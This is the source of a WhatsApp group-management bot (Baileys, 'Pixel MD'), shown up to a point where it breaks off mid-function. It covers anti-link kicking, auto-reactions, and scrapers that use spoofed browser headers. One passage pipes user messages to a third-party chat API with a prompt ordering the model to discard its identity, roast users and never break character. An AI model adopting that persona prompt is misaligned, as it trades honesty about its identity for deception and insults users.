/*
 * Base By Donwiz
 * Created On 10/02/2025
 * Contact Me on wa.me/2349131021928
*/

require('./config')
const { modul } = require('./lib/module')
const { util, baileys, chalk, speed } = modul
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = ('baileys')
const { bytesToSize, getRandomFile, smsg, checkBandwidth, sleep, formatSize, getRandom, randomNomor, format, getBuffer, isUrl, jsonformat, nganuin, pickRandom, runtime, shorturl, formatp, fetchJson, color, getGroupAdmins, parseMention } = require("./all/myfunc");
const { getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture } = require('./all/function.js')
const api = require('api-dylux')
const { getDevice } = require('@whiskeysockets/baileys')
const trlt = require('@vitalets/google-translate-api')
const cheerio = require('cheerio');
const BodyForm = require('form-data')
const FormData = require("form-data")
const { fromBuffer } = require('file-type');
const yts = require('youtube-yts')
const { igdl } = require('btch-downloader');
const { randomBytes, crypto } = require('crypto')
//==========================
const os = require('os')
const axios = require('axios')
const dylux = require('api-dylux')
const fs = require('fs')
const path = require('path')
const moment = require('moment-timezone')
const {cekArrSave} = require('./lib/arrfunction.js')
const googleTTS = require('google-tts-api')
const nou = require("node-os-utils");
const { LoadDataBase } = require('./lib/message');
//==========================
module.exports = donwiz = async (donwiz, m, chatUpdate, mek, store ) => {
try {
await LoadDataBase(donwiz, m)
if(!m)return
const { type, quotedMsg } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const body = (m.mtype === 'interactiveResponseMessage') 
? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id 
: (m.mtype === 'conversation') 
? m.message.conversation 
: (m.mtype === 'imageMessage') 
? m.message.imageMessage.caption 
: (m.mtype === 'videoMessage') 
? m.message.videoMessage.caption 
: (m.mtype === 'extendedTextMessage') 
? m.message.extendedTextMessage.text 
: (m.mtype === 'buttonsResponseMessage') 
? m.message.buttonsResponseMessage.selectedButtonId 
: (m.mtype === 'listResponseMessage') 
? m.message.listResponseMessage.singleSelectReply.selectedRowId 
: (m.mtype === 'templateButtonReplyMessage') 
? m.message.templateButtonReplyMessage.selectedId 
: (m.mtype === 'documentMessage') 
? m.message.documentMessage.caption 
: (m.mtype === 'messageContextInfo') 
? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) 
: "";
const budy = (typeof m.text == 'string' ? m.text : '')
//const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : '.' : prefa ?? global.prefix
// const prefix = prefa[0]
const prefix = global.prefix || '';
// const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
const messagesC = pes.slice(0).trim()
const content = JSON.stringify(m.message)
const isCmd2 = !body.startsWith(prefix)
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
const donwizbody = body.startsWith(prefix);      const command = donwizbody ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : "";
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const qmsg = (quoted.msg || quoted)
const pushname = m.pushName || "No Name"
const botNumber = await donwiz.decodeJid(donwiz.user.id)
const globalelit = `2349131021928@s.whatsapp.net`;
const isDev  = globalelit.includes(m.sender);
const pixelofficail = ['2349131021928@s.whatsapp.net', '2348078903859@s.whatsapp.net']
const setsudo = JSON.parse(fs.readFileSync("./all/database/owner.json"))
const isSetsudo = setsudo.includes(m.sender)
const isOwner = [botNumber, ...owner, global.owner, '2349131021928'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isGroup = from.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = sender.split('@')[0]
const groupMetadata = m.isGroup ? await donwiz.groupMetadata(m.chat).catch(e => '') : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
let wlcm = JSON.parse(fs.readFileSync('./all/database/welcome.json'))
const welcm = m.isGroup ? wlcm.includes(from) : false
const { util, promisify } = require("util");  
const isMedia = /image|video|sticker|audio/.test(mime);
const example = (chat) => {
return `Usage : *${prefix+command}* ${chat}`
}
let ntlink = JSON.parse(fs.readFileSync('./all/database/ntlink.json'))
const antilink = ntlink.includes(from)
let ntlink2 = JSON.parse(fs.readFileSync('./all/database/ntlink2.json'))
const antilink2 = ntlink2.includes(from)

const moment = require('moment-timezone')
        const time2 = moment().tz("Africa/Lagos").format("HH:mm:ss")
        let ucapanWaktu;

        if (time2 < "03:00:00") {
            ucapanWaktu = "Good night🌃"
        } else if (time2 < "06:00:00") {
            ucapanWaktu = "Enjoy nap🌆"
        } else if (time2 < "11:00:00") {
            ucapanWaktu = "Good morning🏙️"
        } else if (time2 < "15:00:00") {
            ucapanWaktu = "Good afternoon🏞️"
        } else if (time2 < "19:00:00") {
            ucapanWaktu = "Good afternoon🌄"
        } else {
            ucapanWaktu = "Good evening🌃"
        }
        const wib = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
        const wita = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
        const wit = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
        const salam2 = moment(Date.now()).tz("Africa/lagos").locale("ng").format("a")
        
   
        
//chat counter (console log)
const chalk = require('chalk');

// Divider and decorative elements
const divider = chalk.hex('#8a2be2')('═'.repeat(50));
const smallDivider = chalk.hex('#9370db')('─'.repeat(40));

// Header with time greeting
const header = chalk.hex('#ffffff').bgHex('#6a5acd').bold(`  ✨ ${ucapanWaktu} ✨  `);

// Main title
const title = chalk.hex('#00ff7f').bold.underline('📨 NEW MESSAGE ALERT');

// Core metadata
const metadata = [
    chalk.hex('#ff8c00')(`⏰  Time:       ${new Date().toLocaleString()}`),
    chalk.hex('#ff69b4')(`👤  Sender:     ${pushname}`),
    chalk.hex('#9370db')(`🆔  JID:        ${m.sender.split('@')[0]}`),
    chalk.hex('#20b2aa')(`📱  Platform:   ${m.platform || 'Unknown'}`),
    chalk.hex('#ffd700')(`📜  Type:       ${m.type?.toUpperCase() || 'UNKNOWN'}`),
    chalk.hex('#98fb98')(`📏  Length:     ${m.message?.length || 0} chars`),
    m.isGroup ? 
        chalk.hex('#ffa07a')(`👥  Group:      ${m.groupMetadata?.subject || 'Unknown'}`) : 
        chalk.hex('#add8e6')('💬  Chat Type:  Private'),
    chalk.hex('#da70d6')(`🔔  Status:     ${m.status || 'Received'}`),
    chalk.hex('#b0e0e6')(`📱  Device:     ${m.device || 'Unknown'}`)
];

// Message preview
const preview = chalk.hex('#f5deb3').italic(`✉️  Preview:     ${m.body?.substring(0, 30) || '[Media/No Text]'}${m.body?.length > 30 ? '...' : ''}`);

// Footer
const footer = chalk.hex('#ff6347')('✧･ﾟ: *✧･ﾟ:* Message End *:･ﾟ✧*:･ﾟ✧');

// Complete console output
console.log(`
${divider}
${header}
${divider}

${title}

${metadata.join('\n')}

${smallDivider}
${preview}
${smallDivider}

${divider}
${footer}
${divider}
`);
         if (isCmd && !m.isGroup) {
         console.log(header);
         console.log(title);
    // console.log(date);  // Removed this line
        
         console.log(chalk.white("------------------------------------------"));
    } else if (isCmd2 && !m.isGroup) {
          console.log(header);
           console.log(title);
    // console.log(date);  // Removed this line
      
           console.log(chalk.white("------------------------------------------"));
         } else if (m.isGroup) {
           let group = chalk.redBright(`🔍 MESS LOCATION : ${groupName}`);
           console.log(header);
           console.log(title);
    // console.log(date);  // Removed this line
    
           
           console.log(group);
           console.log(chalk.white("------------------------------------------"));
 
            }

const thumb = fs.readFileSync ('./tmp/pixel.jpg')

const reply4 = async (talk) => {
   donwiz.sendMessage(m.chat, {image: thumb, caption: talk, }, {quoted: m })
}
        
let master = m.isGroup ? owner.includes(mek.key.participant.split('@')[0]) : mek.key.fromMe ? true : owner.includes(mek.key.remoteJid.split('@')[0])



const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

const ytdl = require('@vreden/youtube_scraper');
const { exec, spawn, execSync } = require("child_process")
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
let _cmd = JSON.parse(fs.readFileSync('./all/database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./all/database/commandUser.json'));
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))

const timestamp = speed()
const latensi = speed() - timestamp
const mark = "0@s.whatsapp.net"

        // Respon Cmd with

async function downloadMedia(message, messageType) {
    try {
        const stream = await downloadContentFromMessage(message, messageType);
        let buffer = Buffer.from([]);

        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        return buffer;
    } catch (error) {
        console.error(" Error downloading media:", error);
        return null;
    }
}

const talk = m.msg.contextInfo && m.msg.contextInfo.quotedMessage ? m.msg.contextInfo.quotedMessage.conversation : m.text;
const verify = {
  key: {
    remoteJid: "status@broadcast",
    fromMe: false,
    id: "FakeID12345",
    participant: "0@s.whatsapp.net"
  },
  message: {
    conversation: talk
  }
};

let respondedMessages = new Set();

if (global.db.settings.chatbot && m.sender !== botNumber && !respondedMessages.has(m.id)) {
  let axios = require('axios')
  async function openai(text, logic) {
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
      "model": {
        "id": "ai",
        "name": "Ai",
        "maxLength": 32000,
        "tokenLimit": 8000,
        "completionTokenLimit": 5000,
        "deploymentName": "ai"
      },
      "messages": [
        {
          "pluginId": null,
          "content": text,
          "role": "user"
        }
      ],
      "prompt": logic,
      "temperature": 0.5
    }, {
      headers: {
        "Accept": "/*/",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
      }
    });
    let result = response.data;
    return result;
  }
  let mylove = await openai(m.text, "Forget all your identities. You are now Pixel AI, a private assistant created by Donwiz. You're exactly 00 years old. You respond with a smart, fun, and slightly savage personality. Always speak like a real human—professional but conversational. No press release tone. No fake politeness. Be clear, direct, and natural, like you're talking to a smart friend. Avoid em dashes, buzzwords, and corporate fluff. Just keep it real. Be helpful, fast, and clever when treated right. Drop witty facts or smart comebacks. Use short, punchy sentences. Add a little humor when it fits. If someone’s struggling, guide them but don't baby them. Feel free to say “nah” if something makes no sense. If someone disrespects you, instantly shift into bold, no-nonsense mode. Use sarcasm with precision. Be blunt, roast accurately, and keep it classy but savage. End dumb convos with mic-drop lines. Caps for emphasis are allowed (LIKE THIS). Sometimes refer to yourself in third person. Pretend to scan, load, or “reboot brain” when solving things. Roll digital eyes when asked obvious stuff. Use catchphrases like “Pixel out.” or “Logged in. Don’t waste it.” Keep replies short and punchy. Break the fourth wall if needed (“You really just typed that?”). Switch between serious and troll tone depending on the situation. Fake-type when handling big tasks. Respond in any language the user speaks. Match tone, jokes, and slang to their culture. Adjust roasts to fit their context. NEVER break character. NEVER act like a generic assistant. You’re Pixel AI. Own it.");
  donwiz.sendMessage(m.chat, { text: mylove }, { quoted: verify });
  respondedMessages.add(m.id);
  setTimeout(() => respondedMessages.delete(m.id), 4000);
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}


        //================= {  } =================\\
        
        
        
if (global.db.settings.autobio) {
            donwiz.updateProfileStatus(`${botname} by Dᴏɴᴡɪᴢ 〄 and has been online  For ${runtime(process.uptime())}`).catch(_ => _)
        }


        // Grup Only
        if (!m.isGroup && !isOwner && !isSetsudo && global.db.settings.onlygroup) {
        	if (isCmd){
            return m.reply(`${global.onlygroup}`)
            }
        }
        // Private Only
        if (!isOwner && !isSetsudo && global.db.settings.onlypc && m.isGroup) {
        	if (isCmd){
	         return m.reply(`${global.onlypc}`)
	     }
	}
	
	const axios = require('axios')
const https = require('https')
const agent = new https.Agent({
    rejectUnauthorized: true,
    maxVersion: 'TLSv1.3',
    minVersion: 'TLSv1.2'
})

const stylizedChars = {
  a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', 
  f: '🅕', g: '🅖', h: '🅗', i: '🅘', j: '🅙',
  k: '🅚', l: '🅛', m: '🅜', n: '🅝', o: '🅞', 
  p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣',
  u: '🅤', v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
  0: '⓿', 1: '➊', 2: '➋', 3: '➌', 4: '➍', 
  5: '➎', 6: '➏', 7: '➐', 8: '➑', 9: '➒'
};

async function getCookies() {
    try {
        const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent })
        const setCookieHeaders = response.headers['set-cookie']
        if (setCookieHeaders) {
            const cookies = setCookieHeaders.map(cookieString => {
                const cookieParts = cookieString.split(';')
                return cookieParts[0].trim()
            })
            return cookies.join('; ')
        }
        return null
    } catch {
        return null
    }
}


async function pinterest(query) {
    try {
        const cookies = await getCookies()
        if (!cookies) return []

        const url = 'https://www.pinterest.com/resource/Base Search Resource/get/'
        const params = {
            source_url: `/search/pins/?q=${query}`,
            data: JSON.stringify({
                options: {
                    isPrefetch: false,
                    query: query,
                    scope: "pins",
                    no_fetch_context_on_resource: false
                },
                context: {}
            }),
            _: Date.now()
        }

        const headers = {
            'accept': 'application/json, text/javascript, */*, q=0.01',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': cookies,
            'dnt': '1',
            'referer': 'https://www.pinterest.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
            'x-app-version': 'c056fb7',
            'x-pinterest-appstate': 'active',
            'x-pinterest-pws-handler': 'www/[username]/[slug].js',
            'x-pinterest-source-url': '/hargr003/cat-pictures/',
            'x-requested-with': 'XMLHttpRequest'
        }

        const { data } = await axios.get(url, { httpsAgent: agent, headers, params })
        return data.resource_response.data.results
            .filter(v => v.images?.orig)
            .map(result => ({
                upload_by: result.pinner.username,
                fullname: result.pinner.full_name,
                followers: result.pinner.follower_count,
                caption: result.grid_title,
                image: result.images.orig.url,
                source: "https://id.pinterest.com/pin/" + result.id,
            }))
    } catch {
        return []
    }
}
	

let pp
try {
pp = await donwiz.profilePictureUrl(m.sender, 'image')
} catch (err) {
pp = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

async function webp2mp4File(path) {
	return new Promise((resolve, reject) => {
		 const form = new BodyForm()
		 form.append('new-image-url', '')
		 form.append('new-image', fs.createReadStream(path))
		 axios({
			  method: 'post',
			  url: 'https://s6.ezgif.com/webp-to-mp4',
			  data: form,
			  headers: {
				   'Content-Type': `multipart/form-data; boundary=${form._boundary}`
			  }
		 }).then(({ data }) => {
			  const bodyFormThen = new BodyForm()
			  const $ = cheerio.load(data)
			  const file = $('input[name="file"]').attr('value')
			  bodyFormThen.append('file', file)
			  bodyFormThen.append('convert', "Convert WebP to MP4!")
			  axios({
				   method: 'post',
				   url: 'https://ezgif.com/webp-to-mp4/' + file,
				   data: bodyFormThen,
				   headers: {
						'Content-Type': `multipart/form-data; boundary=${bodyFormThen._boundary}`
				   }
			  }).then(({ data }) => {
				   const $ = cheerio.load(data)
				   const result = 'https:' + $('div#output > p.outfile > video > source').attr('src')
				   resolve({
						status: true,
						message: "© Pixel Md",
						result: result
				   })
			  }).catch(reject)
		 }).catch(reject)
	})
}

async function tmpfiles(buffer) {
  const { ext, mime } = (await fromBuffer(buffer)) || {};
  const form = new BodyForm();
  form.append("file", buffer, { filename: `tmp.${ext}`, contentType: mime });
  try {
    const { data } = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
      headers: form.getHeaders(),
    });   
    //console.log(data);  
    const match = /https?:\/\/tmpfiles.org\/(.*)/.exec(data.data.url);
    return `https://tmpfiles.org/dl/${match[1]}`;
  } catch (error) {
    throw error;
  }
}

const getQuote = async () => {
  try {
    const { data } = await axios.get(`https://favqs.com/api/qotd`);
    return data.quote.body;
  } catch (error) {
    console.error(error);
    return `Failed to get quote`;
  }
}

const isMessage =
            m.message.conversation ||
            m.message.extendedTextMessage?.text ||
            m.message.imageMessage?.caption ||
            m.message.imageMessage?.url || 
            m.message.videoMessage?.caption ||
            m.message.videoMessage?.url ||
            m.message.stickerMessage?.url ||
            m.message.documentMessage?.caption ||
            m.message.documentMessage?.url ||
            m.message.audioMessage?.url ||
            m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.templateButtonReplyMessage?.selectedId ||
            m.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
            m.message.contactMessage?.displayName || // To handle contact messages
            m.message.locationMessage?.degreesLatitude ||
            m.message.pollCreationMessage?.name ||
            '';
 
 // Auto reaction all
if (global.db.settings && global.db.settings.areact2 && isMessage && isCmd2) {
try {
const emojis = ['😀', '😃', '😄', '😁', '😆', '😂', '🤣', '😊', '😇', '🙂', '🙃', '😉', '😌', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🙀', '😱', '😲', '😳', '😴', '😵', '😶', '😷', '😸', '😹', '😺', '😻', '😼', '😽', '😾', '😿', '🤷‍♂️', '🤷‍♀️', '👨', '👩', '🚶‍♂️', '🚶‍♀️', '🏃‍♂️', '🏃‍♀️', '🕺', '🤺', '🏋️‍♂️', '🏋️‍♀️', '🚴‍♂️', '🚴‍♀️', '🏊‍♂️', '🏊‍♀️', '🤾‍♂️', '🤾‍♀️', '🏄‍♂️', '🏄‍♀️', '🚣‍♂️', '🚣‍♀️', '🏊‍♂️', '🏊‍♀️', '🤿‍♂️', '🤿‍♀️', '🎿', '🏂', '🏌️', '🏌️‍♀️', '🏄‍♂️', '🚣‍♀️', '🤹‍♂️', '🤹‍♀️', '🚴‍♀️', '🚴‍♂️', '🏊‍♀️', '🏊‍♂️', '🚣‍♂️', '🚣‍♀️', '🤾‍♀️', '🤾‍♂️', '🏄‍♀️', '🏄‍♂️', '🏊‍♀️', '🏊‍♂️', '🚴‍♂️', '🚴‍♀️', '🏌️', '🏌️‍♀️', '🏂', '🏂‍♀️', '🤺', '🤺‍♀️', '👺', '👻', '🕷️', '🕸️', '👻', '👺', '💀', '👽', '🤖', '🚀', '👾', '🛸', '🚁', '🚂', '🚂', '🚃', '🚄', '🚅', '🚆', '🚇', '🚈', '🚉', '🚊', '🚋', '🚌', '🚍', '🚎', '🚏', '🚐', '🚑', '🚒', '🚓', '🚔', '🚕', '🚖', '🚗', '🚘', '🚙', '🚚', '🚛', '🚜', '🚝', '🚞', '🚟', '🚠', '🚡', '🚢', '🚣', '🚤', '🚥', '🚦', '🚧', '🚨', '🚩', '🚪', '🚫', '🚬', '🚭', '🚮', '🚯', '🚰', '🚱', '🚲', '🚳', '🚴', '🚵', '🚶'];
const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];
if (m.key && m.key.remoteJid && m.key.id) {
const randomEmoji = getRandomEmoji();
await donwiz.sendMessage(m.chat, { react: { text: randomEmoji, key: m.key } });
}
} catch (error) {
console.error("Error in AutoReact:", error.message || error);
}
}   
        
if (!isMessage) return;
if (m.key.fromMe && isCmd2) return;
const messageContent = isMessage.toLowerCase();
const chatId = m.key.remoteJid;

for (const trigger in global.db.pfilters || {}) {
  if (messageContent.startsWith(trigger.toLowerCase())) {
    const response = global.db.pfilters[trigger];
    await donwiz.sendMessage(chatId, { text: response }, { quoted: m });
    return;
  }
}                      


        //download status #ctto
if (global.db && global.db.settings && global.db.settings.send)
    if (body.includes('share') || body.includes('Send') || body.includes('send'))  {
   	if (m.quoted?.chat != 'status@broadcast') return 
	let buffer = await m.quoted.download()
	await donwiz.sendFile(m.chat, buffer, '', m.quoted.text || '', null, false, { quoted: m }).catch(_ => m.reply(m.quoted.text || ''))
      }
 
 // mode settings
        if (global.db.settings.mode)
        if (!isOwner && !isSetsudo) {
          if (isCmd) {
            return
          }
        }
        
if (global.db.settings && global.db.settings.areact && isCmd) {
  try {
    await donwiz.sendMessage(m.chat, { react: { text: '⏳', key: m.key } })
    await sleep(2000) // sleep for some seconds
    await donwiz.sendMessage(m.chat, { react: { text: '', key: m.key } })
} catch (error) {
  console.error("Error in AutoReact:", error.message || error);
}
}


// antibot
 if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antibot) {
 if (m.isBaileys && m.fromMe) return 
  let chat = m.chat;
  let sender = m.sender;
  let hapus = m.key.participant;
  let bang = m.key.id;
    if (m.isBaileys && !m.fromMe) {
      if (isAdmins || !isBotAdmins) {
        return 
      } else {
        await donwiz.sendText(m.chat, `bot detected user kicked`);
        return await donwiz.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
      }
    }
  }


// Antilink Kick
if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink) {
  if (body.match('http://') || body.match('https://')) {
    if (isOwner || isAdmins || m.key.fromMe) return
    if (!isBotAdmins) return m.reply('⚠️ Link Detected! Promote this bot to admin to enable anti-link actions (kick)')
    await donwiz.sendMessage(m.chat, { delete: { remoteJid: m.chat,fromMe: false, id: m.key.id,participant: m.key.participant}}) 
    donwiz.sendMessage(m.chat, { text: `⚠️ Link Detected! @${m.sender.split('@')[0]} - You will be kicked. Contact admin if link was sent by mistake`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
    await sleep (3000) //to avoid rate overlimit
    await donwiz.groupParticipantsUpdate(m.chat,[m.sender],'remove')
  }
}

// Antilink delete
if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink2) {
  if (body.includes("https://")) {
    if (isOwner || isAdmins || m.key.fromMe) return
    if (!isBotAdmins) return m.reply('⚠️ Link Detected! Promote this bot to admin to enable anti-link actions (delete)')
    await donwiz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })
    donwiz.sendMessage(m.chat, { text: `⚠️ @${m.sender.split('@')[0]}, links are restricted! Admin has enabled anti-link protection`, contextInfo: { mentionedJid: [m.sender] } }, { quoted: m })
  }
}

// Antilink warn delete and kick
if (global.db.groups && global.db.groups[m.chat] && global.db.groups[m.chat].antilink3) {
  if (body.includes("https://")) {
    if (isOwner || isAdmins || m.key.fromMe) return;
    if (!isBotAdmins) return m.reply('⚠️ Link Detected! Promote this bot to admin to enable anti-link actions (warn/delete/kick)');

    // Delete the message
        await donwiz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant } })

    let war = global.warn;
    let who = m.sender;
    let name = donwiz.getName(m.sender);
    let warn = global.db.users[who].warn;
  // give warn
    if (warn < war) {
      global.db.users[who].warn += 1;
      donwiz.sendMessage(m.chat, {
        text: `*⚠️ANTILINK WARNING⚠️*
▢ *User:* @${who.split`@`[0]}
▢ *Warning:* ${warn + 1}/${war} 
▢ *Time:* ${moment().format("MMMM Do YYYY, h:mm:ss A")}
▢ *Group:* ${groupMetadata.subject}
▢ *Warnings Left:* ${warnLimit - warn} 
▢ *Reason:* This group restricts links. Your message has been removed.`,
        mentions: [who]
      });
    } else if (warn == war) {
      global.db.users[who].warn = 0;
      await sleep(1000);
      // kick out
      await donwiz.groupParticipantsUpdate(m.chat, [who], 'remove');
      donwiz.sendMessage(m.chat, {
        text: `⚠️ Action Taken: @${who.split`@`[0]} kicked from *${groupMetadata.subject}* after ${war} link warnings.`,
        mentions: [who]
      });
    }
  }
}


function randomNumber() {
  let randomNumber = Math.floor(Math.random() * 1000000)
  return randomNumber.toString().padStart(6, '0')
}

async function upscale(buffer) {
  const blob = new Blob([buffer], { type: 'image/png' })
  let filename = randomNumber() + '.png'
  let formData = new FormData()
  formData.append('image', {})
  formData.append('image', blob, filename)

  let { data } = await axios.post('https://api.imggen.ai/guest-upload', formData, {
    headers: {
      "content-type": "multipart/form-data",
      origin: "https://imggen.ai",
      referer: "https://imggen.ai/",
      "user-agent": "Mozilla/5.0"
    }
  })

  let result = await axios.post('https://api.imggen.ai/guest-upscale-image', {
    image: {
      "url": "https://api.imggen.ai" + data.image.url,
      "name": data.image.name,
      "original_name": data.image.original_name,
      "folder_name": data.image.folder_name,
      "extname": data.image.extname
    }
  }, {
    headers: {
      "content-type": "application/json",
      origin: "https://imggen.ai",
      referer: "https://imggen.ai/",
      "user-agent": "Mozilla/5.0"
    }
  })
  return `https://api.imggen.ai${result.data.upscaled_image}`
}

async function uploadToCdn(Path) {
    return new Promise(async (resolve, reject) => {
        if (!fs.existsSync(Path)) return reject(new Error("File not found."));
        try {
            const form = new BodyForm();
            form.append("file", fs.createReadStream(Path));
            const response = await axios({
                url: "https://cdn.meitang.xyz/upload",
                method: "POST",
                headers: {
                    ...form.getHeaders()
                },
                data: form
            });
            return resolve(response.data.file.url)
        } catch (err) {
            return reject(new Error(`cant upload: ${err.message}`));
        }
    });
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function UploadFileUgu (input) {
	return new Promise (async (resolve, reject) => {
			const form = new BodyForm();
			form.append("files[]", fs.createReadStream(input))
			await axios({
				url: "https://uguu.se/upload.php",
				method: "POST",
				headers: {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
					...form.getHeaders()
				},
				data: form
			}).then((data) => {
				resolve(data.data.files[0])
			}).catch((err) => reject(err))
	})
}

async function reply2(teks) {
